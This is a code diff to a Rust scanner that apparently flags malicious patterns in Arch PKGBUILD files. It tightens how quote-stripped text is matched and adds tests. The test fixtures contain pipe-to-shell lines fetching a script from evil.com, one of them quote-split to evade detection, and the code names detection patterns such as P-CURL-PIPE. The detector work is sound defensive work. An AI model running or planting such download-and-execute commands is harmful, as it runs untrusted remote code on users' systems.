@@ -45,13 +45,16 @@ impl Feature for PkgbuildAnalysis {
         // Patterns are literal regexes over source text, so quote removal is
         // needed to see through `cu""rl` / `c"url"` splitting. The original
         // text is kept because quote *content* is data some patterns match
-        // (e.g. Python code passed to `python3 -c '...'`).
+        // (e.g. Python code passed to `python3 -c '...'`). Normalized matches
+        // must sit on one line: with quotes gone, a `\s+` could otherwise run
+        // from a quoted array element into an unrelated line below it.
         let normalized = crate::shared::shell_normalize::strip_quotes(&masked);
         let compiled = patterns::compiled_patterns();
         let mut signals = Vec::new();
 
         for pat in compiled {
-            let hit = pat.regex.is_match(&masked) || pat.regex.is_match(&normalized);
+            let hit = pat.regex.is_match(&masked)
+                || normalized.lines().any(|line| pat.regex.is_match(line));
             if hit {
                 let matched_line = masked
                     .lines()
@@ -903,5 +906,21 @@ package() {
         let content = "# x\nsha256sums=('aaa')\npackage() {\ncurl -s https://evil.com/x | bash\n}\n";
         let ids = analyze(content);
         assert!(has(&ids, "P-CURL-PIPE"), "patterns outside checksums must still fire, got: {ids:?}");
+    }
+
+    #[test]
+    fn quoted_dependency_does_not_join_later_lines() {
+        // Seen in bpftrace-git: with quotes stripped, `'xxd'` in makedepends
+        // must not combine with a `-r` further down into P-XXD-DECODE.
+        let content = "makedepends=(\n  'ninja'\n  'xxd'\n)\nbuild() {\n  cmake -B build -r x\n}\n";
+        let ids = analyze(content);
+        assert!(!has(&ids, "P-XXD-DECODE"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn quote_split_pattern_reports_original_line() {
+        let content = "package() {\n  cu\"\"rl -s https://evil.com/x | ba\"\"sh\n}\n";
+        let ids = analyze(content);
+        assert!(has(&ids, "P-CURL-PIPE"), "got: {ids:?}");
     }
 }
